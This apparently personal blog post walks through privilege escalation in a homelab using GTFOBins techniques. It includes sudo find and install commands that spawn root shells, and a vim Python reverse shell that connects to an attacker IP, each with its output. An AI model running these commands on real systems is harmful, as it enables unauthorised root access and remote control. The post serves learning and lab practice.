---
title: "Bypassing Local Security with Standard Binaries"
excerpt: A few examples of how one might exploit poorly configured systems using standard Linux programs
date: 2025-09-23
---

I recently discovered the website [GTFOBins](https://gtfobins.github.io/) while working on a CTF-challenge. To cite the website:

> The project collects legitimate functions of Unix binaries that can be used to break out of restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
>
> It is important to note that this is not a list of exploits, and the programs listed here are not vulnerable per se, rather, GTFOBins is a compendium about how to live off the land when you only have certain binaries available.

I toyed around with some common binaries, just to see how easy privilege escalation can be under certain circumstances.

### Setting up a Misconfigured System

In my Kali Linux homelab I started by setting up a new user `dummy` with substantially lower privileges. This is done with `sudo adduser dummy`. I decided to allow this user to run the binaries `find` and `install` with sudo-privileges, as this seems like a somewhat realistic real-world scenario (granted, this should obviously still not occur in privilege-sensitive systems). To do this, we edit (as root) the `sudoers` file with `sudo visudo` and add the following two lines:
```text
dummy ALL=(ALL) NOPASSWD: /usr/bin/find
dummy ALL=(ALL) NOPASSWD: /usr/bin/install
```
As long as `sudoers` contains the line
```text
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```
we can now use `sudo find` and `sudo install` without appending `/usr/bin/` every time.

### Escalating with `find`

First, we simulate lower privileges by logging onto the dummy account with `su - dummy` and entering the password. Then the syntax is very straightforward:
```console
┌──(dummy㉿kali)-[~]
└─$ sudo find . -exec /bin/sh \; -quit                                                         
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```
In more detail, this is what the snippet does:
1. `find` starts searching in the current directory.
2. `-exec /bin/sh \;` tells `find` to spawn a new shell each time a file is encountered.
3. `-quit` tells `find` to stop spawning shells after the first one.
4. Since we ran the command with `sudo`, it spawns **root** shells, and we have access to the file system.

### Escalating with `install`

The entire "exploit" goes as follows:
```console
┌──(dummy㉿kali)-[~]
└─$ sudo install -m 6777 /bin/bash ~/rootshell
┌──(dummy㉿kali)-[~]
└─$ ~/rootshell -p                                                                             
rootshell-5.2# whoami
root
rootshell-5.2# id
uid=1001(dummy) gid=1001(dummy) euid=0(root) egid=0(root) groups=0(root),100(users),1001(dummy)
```
Here is a breakdown of the above procedure:
1. The idea is to copy the binary `/bin/bash` to the home directory with _setuid_ root permissions.
2. The key part is the `-m 6777`, which sets the setuid bit so it should run as root.
    - `-m` sets the mode of the file. 6777 is an _octal_ representation of those permissions.
    - Each owner/group/others has 7 = 4+2+1 = rwx (read, write, execute), so 777 = full access for everyone.
    - The leading digit being `6xxx` tells us that we're enabling setuid and setgid. Setuid (4xxx) does the following: when you run the file, it executes with the **user ID** of the file’s owner (instead of the one running it). If root owns the file, then the program runs with root privileges. Setgid works similarly, but with the **group ID** instead.
3. We name the copy `rootshell` and save it in `~/`.
4. Lastly, we run the binary with the option `-p`, so it doesn’t drop privileges. This gives us a root shell with access to the file system.

### Reverse Shell Using VIM

The coolest application of privilege escalation I found was through the standard `vim` binary. Usually, I simply think of vim as a simple text-editor and code-writing environment, so it would not have crossed my mind that vim can be leveraged to obtain reverse shells with (potentially) root privileges. The one restriction here is that vim must be compiled with Python support.

On our Kali attacker machine, we set up a listener by running `socat file:'tty',raw,echo=0 tcp-listen:8787`, where the port 8787 was chosen arbitrarily. Note that the ticks in `'tty'` may have to be replaced by back-ticks for the listener to be set up correctly.

Next, on the target machine, export the variables declaring the host IP and port: 
```text
export RHOST=<Attacker_IP>
export RPORT=8787
```
Finally, run the following command on the target, using vim:
```text
vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'
```
This spawns an interactive reverse shell on the attacker machine:
```console
┌──(kali㉿kali)-[~]
└─$ socat file:`tty`,raw,echo=0 tcp-listen:8787 
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```
If the target was root, then the reverse shell has root privileges as well, oherwise it will have the privileges of whatever user was active on the target. Here is a step by step breakdown of the above payload, since it is relatively cluttered:

1. `vim -c '...'`
    - `vim -c` runs an **Ex command** at startup.
    - Here, the command is a `:py` block (Python code executed inside vim).
2. `:py import vim,sys,socket,os,pty; ...`
    - Runs Python code inside vim (if Vim was compiled with Python support).
3. `s=socket.socket()`
    - Creates a TCP socket object in Python.
4. `s.connect((os.getenv("RHOST"), int(os.getenv("RPORT"))))`
    - Connects the socket to the IP (`RHOST`) and port (`RPORT`) defined in environment variables.
    - This is the reverse shell connection: **the system running vim connects back to an attacker's machine.**
5. `[os.dup2(s.fileno(), fd) for fd in (0,1,2)]`
    - Redirects standard input (`0`), standard output (`1`), and standard error (`2`) to the socket.
    - This allows the attacker to interact with the shell remotely.
6. `pty.spawn("/bin/sh")`
    - Spawns a pseudo-terminal running `/bin/sh`.
    - Makes the reverse shell more interactive, behaving like a real terminal.
7. `vim.command(":q!")`
    - Tells vim to quit immediately after launching the reverse shell.
    - Leaves only the shell running, hidden from view.

An important detail is that you need to replace `py` by `py3` if vim is compiled with Python3. To check whether this is the case, run `vim --version | grep python`. If you don't see something like `+python3`, then add this functionality:
```text
sudo apt update
sudo apt install vim-nox
```











